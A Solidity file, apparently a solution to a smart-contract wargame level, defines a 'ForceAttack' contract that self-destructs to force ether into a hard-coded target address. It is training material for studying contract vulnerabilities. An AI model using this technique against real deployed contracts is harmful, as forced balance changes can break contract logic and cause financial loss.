// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level07.sol";

contract ForceAttack 
{
    address payable addr = payable(0x7CBB23AcD51478F84ED9a95ff240FEfdf2E09112);
    
    constructor() payable 
    {

    }

    function selfdestruct_contract() public
    {
        selfdestruct(addr);
    }

}
